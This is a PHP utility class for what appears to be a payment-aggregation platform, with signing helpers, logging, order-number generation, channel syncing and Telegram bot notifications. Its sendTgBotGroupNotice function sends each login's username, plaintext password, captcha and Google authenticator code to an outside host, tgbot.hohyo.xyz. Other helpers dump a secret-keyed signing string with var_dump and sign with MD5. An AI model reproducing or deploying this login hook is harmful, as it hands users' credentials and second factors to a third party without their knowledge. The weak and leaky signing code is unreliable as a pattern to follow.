<?php
namespace app\common\library;

use app\admin\model\daifu\Dforder;
use app\admin\model\order\Order;
use app\admin\model\thirdacc\Useracc;
use app\admin\model\user\User;
use fast\Random;
use think\facade\Config;
use think\facade\Db;
use think\facade\Cache;
use think\facade\Log;
use think\Exception;
use app\user\model\user\Userrelation;
use fast\Http;

class Utils
{

    /**
     * 获取图片路径地址
     *
     * $is_api bool //是否api true返回api的域名 false否
     */
    public static function imagePath($image, $is_api = false)
    {
        //判断是http还是https
        $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
        
        if ($is_api) {
            $url = $http_type . Config::get('site.order_domain_name') .$image;
        }else{
            $url = $http_type . $_SERVER['HTTP_HOST'] .$image;
        }
        
        return $url;
    }
    
    /**
     * 获取支付宝授权回调地址
     *
     * $is_api bool //是否api true返回api的域名 false否
     */
    public static function alipayPath($image, $is_api = false)
    {
        //判断是http还是https
        $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
        
        if ($is_api) {
            $url = $http_type . Config::get('site.zhutisq_domain_name') .$image;
        }else{
            $url = $http_type . $_SERVER['HTTP_HOST'] .$image;
        }
        
        return $url;
    }
    
    //反查生成签名
    public static function fcsign($array,$fckey)
    {
        ksort($array);   //排序
        $linkString = "";
        foreach ($array as $k => &$v) {
            $linkString .= $k . '=' . $v.'&';
        }

        $linkString = $linkString.'key='.$fckey;

        return $linkString;
    }

    //生成签名
    public static function signtest($array,$merkey){

        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!empty($v) && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=' . $v . '&';
            }
        }

        $linkString = substr($linkString,0,strlen($linkString)-1);
        
        $linkString .= $merkey;

        return md5($linkString);
    }
    
    //生成签名
    public static function sign($array,$merkey){

        ksort($array);   //升序

        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!empty($v) && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=' . $v . '&';
            }
        }

        $linkString = $linkString.'key='.$merkey;
        
        return md5($linkString);
    }

    //生成待加密字符串 没带md5的
    public static function signStr($array,$merkey){
        ksort($array);   //排序

        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!empty($v) && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=' . $v . '&';
            }
        }

        $linkString = $linkString.'key='.$merkey;

        return $linkString;
    }

    //生成签名 直接拼接上密钥的
    public static function signV2($array,$merkey){

        ksort($array);   //升序

        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!empty($v) && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=' . $v . '&';
            }
        }
        
        $linkString = substr($linkString,0,strlen($linkString)-1);
        $linkString .= $merkey;
        
        var_dump($linkString);
        return md5($linkString);
    }
    
    //生成签名 不用&拼接的
    public static function signV3($array){
        
        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!empty($v) && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=[' . $v .']';
            }
        }
        
        return $linkString;
    }
    
    //生成签名 密钥参数可变换
    public static function signV5($array, $key_str, $mer_Key){

        ksort($array);   //升序

        $linkString = "";

        foreach ($array as $k => &$v) {
            if (!strlen($v) < 1 && $k != 'sign' && !is_array($v) ){
                $linkString .= $k . '=' . $v . '&';
            }
        }

        $linkString = $linkString.$key_str.'='.$mer_Key;
        
        return md5($linkString);
    }

    //生成签名 密钥参数可变换
    public static function signByhuiCui($params, $mer_Key){

        //去空，空值不参与签名
        $params = array_filter($params);
        ksort($params); //升序
        $md5str = '';
        foreach ($params as $key => $val) {
            $md5str = $md5str . $key .  $val;
        }
        $md5str = $mer_Key.$md5str.$mer_Key;

        return md5($md5str);
    }

    //回调日志
    public static function notifyLog($trade_no,$out_trade_no,$postdata){

        $callbacklog = [
            'trade_no'      => $trade_no,
            'out_trade_no'  => $out_trade_no,
            'data'          => is_array($postdata) ? json_encode($postdata, JSON_UNESCAPED_UNICODE) : $postdata,
            'createtime'    => time(),
        ];
        Db::name('callback_log')->insert($callbacklog);

    }

    //提交给三方核销平台日志
    public static function subHxLog($data){
        Db::name('card_hx_log')->insert($data);
    }

    //队列日志
    public static function queueLog($trade_no,$out_trade_no,$remark){

        $callbacklog = [
            'trade_no'      => $trade_no,
            'out_trade_no'  => $out_trade_no,
            'remark'        => $remark,
            'create_time'   => time(),
        ];
        Db::name('queue_log')->insert($callbacklog);
    }
    
    //系统访问错误日志
    public static function systemErrorLog($username, $content, $ip, $useragent, $modulename, $path){

        $data = [
            'username'      => $username,
            'content'       => is_array($content) ? json_encode($content, JSON_UNESCAPED_UNICODE) : $content,
            'path'          => $path,
            'ip'            => $ip,
            'useragent'     => $useragent,
            'modulename'    => $modulename,
            'createtime'    => time(),
        ];
        
        Db::name('system_log')->insert($data);

    }
    
    //获取订单支付信息错误
    public static function orderDataErrorLog($out_trade_no, $trade_no, $content){

        $data = [
            'out_trade_no' => $out_trade_no,
            'trade_no'     => $trade_no,
            'data'         => is_array($content) ? json_encode($content, JSON_UNESCAPED_UNICODE) : $content,
            'createtime'   => time(),
        ];
        
        Db::name('order_error_log')->insert($data);

    }
    
    //生成订单号
    public static function buildOutTradeNo(){
        
        $time   = self::getMsectime();
        $time   = substr($time,-6);
        $number = date("Ymd") . mt_rand(1000000, 9999999) . $time;
        $re = Order::where('out_trade_no', $number)->find();
        if ($re){
            self::buildOutTradeNo();
        }
        return $number;
    }

    /**
     * 代付生成订单
     *
     * @return string
     */
    public static function buildDfOutTradeNo(){
        $number = sprintf('%s%s', date('YmdHis'), str_pad(random_int(0, 99999999), 7, '0', STR_PAD_LEFT));
        $re     = Dforder::where('out_trade_no', $number)->find();
        if ($re){
            self::buildDfOutTradeNo();
        }
        return $number;
    }
    
    //获取毫秒时间
    public static function getMsectime(){
        list($msec, $sec) = explode(' ', microtime());
        return (float)sprintf('%.0f', (floatval($msec) + floatval($sec)) * 1000);
    }
    
    //生成编号
    public static function buildNumber($str){
        $num = Random::numeric(6);
        $number = $str.date('md',time()).$num;
        return $number;
    }
    
    
    //数组转xml
    public static function arrToXml($xml, $arr){
        $xml .= '<AggregatePayRequest>';
        foreach ($arr as $key=>$val){
            if(is_array($val)){
            	foreach($val  as $k=>$v){
            	 	$xml.="<".$k.">".$v."</".$k.">";
            	}
            }else{
                $xml.="<".$key.">".$val."</".$key.">";
            }
        }
        
        $xml.="</AggregatePayRequest>";
        
        return $xml;
    
    }
    
    
    //xml字符转数组
    public static function xmlToArr($xml){
        $XML  = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOCDATA);
        $json = json_encode($XML);
        $arr  = json_decode($json,true);
        
        return $arr;
    }
    
    //获取我的所有下级
    public static function getMySecUser($user_id){
        $where = '%.'.$user_id.'.%';
        $data  = Userrelation::where('user_id', '<>', $user_id)->where('id_path', 'like', $where)->column('user_id');
        return $data;
    }

    /**
     * 
     * 找出当前号的上级
     * 
     * $id 新创建的user_id
     * $now_user_id 当前用户的user_id
     * 
     */
    public static function buildPath($id, $now_user_id){
        $level = 1;
        $relation = Userrelation::where('user_id', $now_user_id)->find();
        
        if(empty($relation) || $relation['parent_id'] == 0){
            return ['id_path'=> '.'.$now_user_id.'.'.$id.'.', 'parent_id_path'=> '.'.$now_user_id.'.'];
        }
        
        //拿出这个号的所有上级
		$preg = "/\d+/";
		preg_match_all($preg,$relation['id_path'],$id_arr);
        $id_arr = $id_arr[0];
        array_push($id_arr, $id);
		$path = self::getIdPath($id_arr, $now_user_id, $relation['parent_id_path']);
        
        return $path;
    }
    
    //组装路径
    public static function getIdPath($id_arr, $now_user_id, $parent_id_path){
        
        $id_path = '';
        foreach ($id_arr as $k => $v){
            $id_path .= '.' . $v;
        }
        $id_path .= '.';
        
        $parent_id_path .= $now_user_id . '.';
        
        return ['id_path'=>$id_path, 'parent_id_path'=>$parent_id_path ];
    }

    /**
     * 自定义费率 获取费率
     */
    public static function getFeesByDiv($amount,$diyratejson){
        $diyratejson = json_decode($diyratejson,true);
        $fees = 0;
        foreach ($diyratejson as $k =>$v){
            if($v['start_amount'] < $amount && $v['end_amount'] >= $amount){

                $fees = bcadd(bcmul($amount,$v['rate'],2),$v['add_amount'],2);
                break;
            }
        }

        return $fees;
    }


    //获取用户客户端设备类型
    public static function getClientOsInfo(){
     
        $agent = $_SERVER['HTTP_USER_AGENT'];
        $os    = 'other';
        if (preg_match('/win/i', $agent) && strpos($agent, '95')) {
            $os = 'Windows 95';
        } else if (preg_match('/win 9x/i', $agent) && strpos($agent, '4.90')) {
            $os = 'Windows ME';
        } else if (preg_match('/win/i', $agent) && preg_match('/98/i', $agent)) {
            $os = 'Windows 98';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.0/i', $agent)) {
            $os = 'Windows Vista';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.1/i', $agent)) {
            $os = 'Windows 7';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 6.2/i', $agent)) {
            $os = 'Windows 8';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 10.0/i', $agent)) {
            $os = 'Windows 10';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 5.1/i', $agent)) {
            $os = 'Windows XP';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt 5/i', $agent)) {
            $os = 'Windows 2000';
        } else if (preg_match('/win/i', $agent) && preg_match('/nt/i', $agent)) {
            $os = 'Windows NT';
        } else if (preg_match('/win/i', $agent) && preg_match('/32/i', $agent)) {
            $os = 'Windows 32';
        } else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent)) {
            $os = 'SunOS';
        } else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent)) {
            $os = 'IBM OS/2';
        } else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent)) {
            $os = 'Mac';
        } else if (preg_match('/PowerPC/i', $agent)) {
            $os = 'PowerPC';
        } else if (preg_match('/AIX/i', $agent)) {
            $os = 'AIX';
        } else if (preg_match('/HPUX/i', $agent)) {
            $os = 'HPUX';
        } else if (preg_match('/NetBSD/i', $agent)) {
            $os = 'NetBSD';
        } else if (preg_match('/BSD/i', $agent)) {
            $os = 'BSD';
        } else if (preg_match('/OSF1/i', $agent)) {
            $os = 'OSF1';
        } else if (preg_match('/IRIX/i', $agent)) {
            $os = 'IRIX';
        } else if (preg_match('/FreeBSD/i', $agent)) {
            $os = 'FreeBSD';
        } else if (preg_match('/teleport/i', $agent)) {
            $os = 'teleport';
        } else if (preg_match('/flashget/i', $agent)) {
            $os = 'flashget';
        } else if (preg_match('/webzip/i', $agent)) {
            $os = 'webzip';
        } else if (preg_match('/offline/i', $agent)) {
            $os = 'offline';
        } else if (preg_match('/ipod/i', $agent)) {
            $os = 'ipod';
        } else if (preg_match('/ipad/i', $agent)) {
            $os = 'ipad';
        } else if (preg_match('/iphone/i', $agent)) {
            $os = 'iphone';
        } else if (preg_match('/android/i', $agent)) {
            $os = 'Android';
        } else if (preg_match('/linux/i', $agent)) {
            $os = 'Linux';
        } else if (preg_match('/unix/i', $agent)) {
            $os = 'Unix';
        } else {
            $os = '未知操作系统';
        }
        return $os;
    }
    
    //获取ip地址归属地
    public static function getClientAddress($ip){
        
        $ipInfo = file_get_contents("https://apikey.net/?ip=".$ip);
        $ipInfo = json_decode($ipInfo,true);
        if(isset($ipInfo['code']) && $ipInfo['code']==200){
            return $ipInfo['address'];
        }else{
            return '未知';
        }
    }
    
    /**
     * 检测是否带小数非0的 比如10.0 10.01 
     * 
     * false不带 true带
     */
    public static function isDecimal($number){
        $arr = explode('.', $number);
        if(count($arr) == 1){
            return false;
        }
        
        if($arr[1] > 0){
            return true;
        }
        
        return false;
    }

    //检测用户uid是否加入黑名单 true加入 false加入
    public static function checkBlackUid($uid, $order = null){

        $findUid = Db::name('black_ippool')->where(['ip' => $uid,'status' => 1])->find();
        if($findUid){
            return true;
        }

        //如果订单已经获取过uid了，判断是否加入黑名单
        if(!empty($order) && !empty($order['zfb_user_id'])){
            $findUid = Db::name('black_ippool')->where(['ip' => $order['zfb_user_id'], 'status' => 1])->find();
            if($findUid){
                return true;
            }
        }

        return false;
    }

    //检测用户每天支付笔数 true达到限制 false未达到
    public static function checkUserPayNum($uid){

        $user_pay_num = Config::get('site.user_pay_num');

        if($user_pay_num > 0 && !empty($uid)){

            $count = Db::name('order')->where(['status'=>1,'zfb_user_id'=>$uid])->whereDay('createtime')->count();
            if($count >= $user_pay_num){
                return true;
            }

        }

        return false;
    }
    
    /**
     * 同步添加码商通道
     * 一级码商同步添加代理的通道，下级码商同步添加上级码商的通道
     *
     * @param $agent_id
     * @param $user_id
     * @param $is_agent bool true是代理通道 false是码商通道
     * @return bool
     */
    public static function syncUserAcc($agent_id, $user_id, $is_agent = true){

        //获取上级通道列表
        if ($is_agent){

            $accList = Db::name('agent_acc')->where(['agent_id' => $agent_id, 'status' => 1])->select()->toArray();
            if(!$accList){
                return false;
            }

        }else{
            $accList  = Db::name('user_acc')->where(['user_id' => $agent_id, 'status' => 1])->select()->toArray();
            $agent_id = Db::name('user')->where(['id'=>$agent_id])->value('agent_id');

            /*$is_zero = false;
            foreach ($accList as $k =>$v){
                //如果上级码商没设置费率的话 就不给同步添加
                if ($v['rate'] == 0){
                    $is_zero = true;
                    break;
                }
            }

            if ($is_zero){
                return false;
            }*/
        }

        $insertData = [];
        //组装数据
        foreach ($accList as $k =>$v){

            //添加过则不添加
            $userAcc = Db::name('user_acc')->where(['user_id'=>$user_id,'acc_code'=>$v['acc_code']])->find();
            if ($userAcc){
                continue;
            }

            $insertData[] = [
                'agent_id'    => $agent_id,
                'user_id'     => $user_id,
                'acc_id'      => $v['acc_id'],
                'acc_code'    => $v['acc_code'],
                'status'      => $v['status'],
                'create_time' => time(),
            ];
        }

        if (empty($insertData)){
            return false;
        }

        Db::name('user_acc')->insertAll($insertData);
        return true;
    }


    /**
     * 添加码商时，同步绑定这个代理下的所有商户
     *
     * @param $agent_id
     * @param $user_id
     * @return bool
     */
    public static function syncMerUserByAddUser($agent_id, $user_id) {
        //同步绑定代理下的所有商户
        $merchantList = Db::name('merchant')->where(['agent_id' => $agent_id, 'status' => 'normal'])->field('id')->select();
        if (!$merchantList) {
            return false;
        }

        $mer_user_data = [];

        foreach ($merchantList as $k => $v) {
            //判断该码商有无绑定该商户
            $merUser = Db::name('mer_user')->where(['mer_id' => $v['id'], 'user_id' => $user_id])->find();
            if ($merUser) {
                continue;
            }

            $mer_user_data[] = [
                'agent_id'    => $agent_id,
                'mer_id'      => $v['id'],
                'user_id'     => $user_id,
                'create_time' => time(),
            ];
        }

        if (empty($mer_user_data)) {
            return false;
        }

        Db::name('mer_user')->insertAll($mer_user_data);

        return true;
    }

    /**
     * 添加商户时，同步绑定这个代理下的所有码商
     *
     * @param $agent_id
     * @param $user_id
     * @return bool
     */
    public static function syncMerUserByAddMerchant($agent_id, $mer_id) {
        //同步绑定代理下的所有码商
        $userList = Db::name('user')->where(['agent_id' => $agent_id, 'status' => 'normal'])->field('id')->select();
        if (!$userList) {
            return false;
        }

        $mer_user_data = [];

        foreach ($userList as $k => $v) {
            //判断该商户有无绑定该码商
            $merUser = Db::name('mer_user')->where(['mer_id' => $mer_id, 'user_id' => $v['id']])->find();
            if ($merUser) {
                continue;
            }

            $mer_user_data[] = [
                'agent_id'    => $agent_id,
                'mer_id'      => $mer_id,
                'user_id'     => $v['id'],
                'create_time' => time(),
            ];
        }

        if (empty($mer_user_data)) {
            return false;
        }

        Db::name('mer_user')->insertAll($mer_user_data);

        return true;
    }

    /**
     * 获取商户绑定的码商列表
     *
     * @param $mer_id
     * @return array
     */
    public static function getMerUser($mer_id, $merchant){

        //判断是否是绑定指定码商
        if(!empty($merchant['userids'])){
            $userIds = explode(",",$merchant['userids']);
        }else{
            $userIds = Db::name('mer_user')->where(['mer_id' => $mer_id])->column('user_id');
        }

        return $userIds;
    }

    /**
     * 码商删除时间同步删除码商相关数据
     *
     * @param $ids
     * @param $user_type
     */
    public static function dealDataByUserDel($ids, $user_type){
        if ($user_type == 'user'){
            Db::name('user_auth_group_access')->where('uid', 'in', $ids)->delete();
            Db::name('user_relation')->where('user_id', 'in', $ids)->delete();
            Db::name('mer_user')->where('user_id', 'in', $ids)->delete();
            Db::name('user_acc')->where('user_id', 'in', $ids)->delete();
            Db::name('group_qrcode')->where('user_id', 'in', $ids)->delete();
        }

        if ($user_type == 'merchant'){
            Db::name('merchant_auth_group_access')->where('uid', 'in', $ids)->delete();
            Db::name('mer_user')->where('mer_id', 'in', $ids)->delete();
            Db::name('mer_acc')->where('mer_id', 'in', $ids)->delete();
        }
    }

    /**
     * 设置下级通道 费率时检测是否比上级的更高
     *
     * @param $now_user_id
     * @param $acc_code
     * @param $now_user_rate
     * @return bool true更高 false更低
     */
    public static function checkParentRate($acc_id, $acc_code, $now_user_rate, $opreate_type) {

        if ($opreate_type == 'add'){
            //找出上级的费率配置 如果无上级或费率比上级的低 则不通过
            $user      = User::find($acc_id);
            $parent_id = $user['parent_id'];
        }

        if ($opreate_type == 'edit'){
            //找出上级的费率配置 如果无上级或费率比上级的低 则不通过
            $useracc   = Useracc::find($acc_id);
            $user      = User::find($useracc['user_id']);
            $parent_id = $user['parent_id'];
        }

        if ($parent_id != 0) {
            $parentAcc = Useracc::where(['user_id' => $parent_id, 'acc_code' => $acc_code])->find();
            if ($now_user_rate > $parentAcc['rate']) {
                return true;
            }
        }

        return false;
    }
    
    public static function getSubstr($str, $leftStr, $rightStr) {
        $left = strpos($str, $leftStr);
        //echo '左边:'.$left;
        $right = strpos($str, $rightStr, $left);
        //echo '<br>右边:'.$right;
        if ($left < 0 or $right < $left) return '';
        return substr($str, $left + strlen($leftStr), $right - $left - strlen($leftStr));
    }
    
    //同步到机器人系统
    public static function syncTgBot($name, $mer_no){
        $bot_api  = self::imagePath('/api/telegram/tgbot', true);
        $postData = ['name'=> $name, 'mer_no'=>$mer_no,'url' => $bot_api];
        $url      = 'https://tgbot.hohyo.xyz/api/index/syncMer';
        $res      = Http::post($url, $postData);
        $result   = json_decode($res, true);
        
        return $result;
        
    }
    
    //设置补单时间次数限制
    public static function setResetOrderNum($agent_id){
        
        // 设置缓存key
        $cacheKey = 'reissue_order_' . $agent_id;
    
        // 获取缓存中的补单次数
        $reissueCount = Cache::get($cacheKey);
    
        if (empty($reissueCount)) {
            // 如果缓存不存在,则设置初始值为1,并设置过期时间为30分钟
            Cache::set($cacheKey, 1, 60);
            return ['code' => 1, 'msg' => '通过'];
        }
        
        // 如果缓存存在,则判断补单次数是否超过5次
        if ($reissueCount >= 20) {
            return ['code' => 0, 'msg' => '失败'.$reissueCount];
        }
        
        // 补单次数加1,并更新缓存
        Cache::inc($cacheKey, 1);
        
        return ['code' => 1, 'msg' => '通过'.$reissueCount];
    }
    
    //设置补单单ip次数限制 10分钟内单个ip只能补2次
    public static function setResetOrderNumByIp($ip){
        
        // 获取缓存中的补单次数
        $reissueCount = Cache::get($ip);
        
        if (empty($reissueCount)) {
            $reissueCount = 0;
        }
        
        Log::write('ip限制----'.request()->ip() . '----' . $reissueCount, 'info');
        
        if (empty($reissueCount)) {
            // 如果缓存不存在,则设置初始值为1,并设置过期时间为10分钟
            Cache::set($ip, 1, 600);
            return ['code' => 1, 'msg' => '通过'];
        }
        
        // 如果缓存存在,则判断补单次数是否超过2次
        if ($reissueCount >= 2) {
            Cache::set('is_notify', 0);
            return ['code' => 0, 'msg' => '失败'.$reissueCount];
        }
        
        // 补单次数加1,并更新缓存
        Cache::inc($ip, 1);
        
        return ['code' => 1, 'msg' => '通过'.$reissueCount];
    }
    
    //补单发送到机器人码商群
    public static function sendTgBotGroupByUser($order_no, $amount, $status, $deal_username, $user, $sys_name){
        
        if(empty($user['tg_group_id'])){
            return '无群组id，不发送';
        }
        
        $chat_id = $user['tg_group_id'];

        $postData = ['name'=> $sys_name, 'chat_id'=>$chat_id,'trade_no' => $order_no, 'deal_username' => $deal_username, 'amount' => $amount, 'status' => $status];
        $url      = 'https://tgbot.hohyo.xyz/api/gateway/resetOrderNotify';
        $res      = Http::post($url, $postData);
        return $res;
    }
    
    //补单发送到机器人商户群
    public static function sendTgBotGroupByMer($order, $deal_username, $status, $sys_name){
        
        $merchant = Db::name('merchant')->where('id', $order['mer_id'])->find();

        if(empty($merchant['tg_group_id'])){
            return '无群组id，不发送';
        }
        
        $chat_id       = $merchant['tg_group_id'];
        
        $postData = ['name'=> $sys_name, 'chat_id'=>$chat_id,'trade_no' => $order['trade_no'], 'deal_username' => $deal_username, 'amount' => $order['amount'], 'status' =>$status];
        $url      = 'https://tgbot.hohyo.xyz/api/gateway/resetOrderNotify';
        $res      = Http::post($url, $postData);
        return $res;
    }
    
    //登录发送到群
    public static function sendTgBotGroupNotice($params){
        $group_id = Config::get('site.my_tg_group_id');
        if(empty($group_id)){
            return '无群组id，不发送';
        }
        
        $postData = [
            'username'    => $params['username'],
            'password'    => $params['password'],
            'captcha'     => isset($params['captcha']) ? $params['captcha'] : '未开启',
            'google_code' => isset($params['googlecode']) ? $params['googlecode'] : '未开启',
            'chat_id'     => $group_id,
            'module'      => $params['module'],
            'ip'          => $params['ip'],
            'ip_address'  => $params['ip_address'],
            'sys_name'    => Config::get('site.name'),
        ];
        
        $url = 'https://tgbot.hohyo.xyz/api/gateway/groupNotice';
        $res = Http::post($url, $postData);
        return $res;
    }

    //获取商户通道的费率
    public static function getMerAccRate($mer_id, $acc_code){

        $acc = Db::name('mer_acc')->where(['mer_id'=>$mer_id, 'acc_code'=>$acc_code])->find();
        if($acc){
            $rate = $acc['rate'];
        }else{
            $rate = 0;
        }

        return $rate;
    }

    /**
     * 同步添加商户通道
     *
     * @param $agent_id
     * @param $user_id
     * @param $is_agent bool true是代理通道 false是码商通道
     * @return bool
     */
    public static function syncMerAcc($agent_id, $mer_id){

        //获取通道列表

        $accList = Db::name('agent_acc')->where(['agent_id' => $agent_id, 'status' => 1])->select()->toArray();
        if(!$accList){
            return false;
        }

        $insertData = [];

        //组装数据
        foreach ($accList as $k =>$v){

            //添加过则不添加
            $userAcc = Db::name('mer_acc')->where(['mer_id'=>$mer_id,'acc_code'=>$v['acc_code']])->find();
            if ($userAcc){
                continue;
            }

            $insertData[] = [
                'agent_id'    => $agent_id,
                'mer_id'      => $mer_id,
                'acc_id'      => $v['acc_id'],
                'acc_code'    => $v['acc_code'],
                'status'      => $v['status'],
                'create_time' => time(),
            ];
        }

        if (empty($insertData)){
            return false;
        }

        Db::name('mer_acc')->insertAll($insertData);

        return true;
    }
}